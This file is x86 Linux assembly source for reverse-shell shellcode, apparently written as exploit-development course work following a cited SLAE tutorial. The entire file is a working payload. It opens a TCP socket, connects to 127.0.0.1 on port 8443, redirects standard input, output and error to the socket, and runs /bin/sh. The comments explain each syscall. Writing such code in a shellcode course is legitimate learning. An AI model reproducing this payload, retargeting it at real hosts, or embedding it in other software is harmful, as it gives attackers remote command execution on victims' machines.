;Author: Henry Wang
;Program: reverse shell in assembly
;reference: https://www.rcesecurity.com/2014/07/slae-shell-reverse-tcp-shellcode-linux-x86/

global _start
section .text
_start:

_socket:
    ;create socket: sockfd = socket(AF_INET, SOCK_STREAM, 0);
    ;AF_INET = 2 (from sys/socket.h->bits/socket.h)
    ;SOCK_STREAM = 1 (from bits/socket.h)
    ;sys_socket need a sub opcode in man socketcall (SYS_SOCKET is 1)
    ;in /usr/include/linux/net.h
    push 0x66
    pop eax ;SOCKETCALL
    push 0x1
    pop ebx ;SYS_SOCKET

    xor edx,edx
    
    push edx; 0
    push 0x1; SOCK_STEAM
    push 0x2; AF_INET

    mov ecx, esp
    int 0x80

    mov esi, eax ; socketfd is in esi

_connect:
    ;struct sockaddr_in addr;
    ;addr.sin_family = AF_INET; AF_INET=2 (bits/socket.h)
    ;addr.sin_port = htons(port); 
    ;addr.sin_addr.s_addr = inet_addr(server); //0x100007f
    ;connect(sockfd,(struct sockaddr *) &addr, sizeof(addr));
    ;as the struct will be passed to bind, will construct the strut to stack, using push.

    ;create sockaddr
    push 0x2;twice, each 4Bytes
    pop  ecx; add 8bytes of padding (sin_zero in sockaddr_in) 
addpadding: 
    push edx
    loop addpadding

    push dword 0x0100007f
    push word 0xFB20; 0x20FB=8443, port BIG-INDIAN
    push word 0x2; AF_INET
    mov ecx, esp; &addr 
 
    push byte 0x10; sizeof(addr)
    ;push 0x10 for debug purpose
    push ecx
    push esi
    mov ecx, esp
 
    push 0x66
    pop eax; SOCKETCALL 
    add ebx,2; ebx+2=3 SYS_CONNECT
 
    int 0x80


_dup2:
    ;dup2(sockfd, 0);
    ;dup2(sockfd, 1);
    ;dup2(sockfd, 2);
    ;syscall is 63
    push 63;dup2
    pop eax
    mov ebx,esi;sockfd
    xor ecx,ecx;0
    int 0x80

    push 63;
    pop eax
    inc ecx
    int 0x80

    push 63;
    pop eax
    inc ecx
    int 0x80

_execve:
    ;execve("/bin/sh", NULL, NULL)
    ;syscall is 11
    push 11;execve
    pop eax

    xor ecx,ecx
    mov edx,ecx
 
    push edx;"\0"
    push 0x68732f6e
    push 0x69622f2f 
    mov ebx,esp

    int 0x80
    
section .data
    
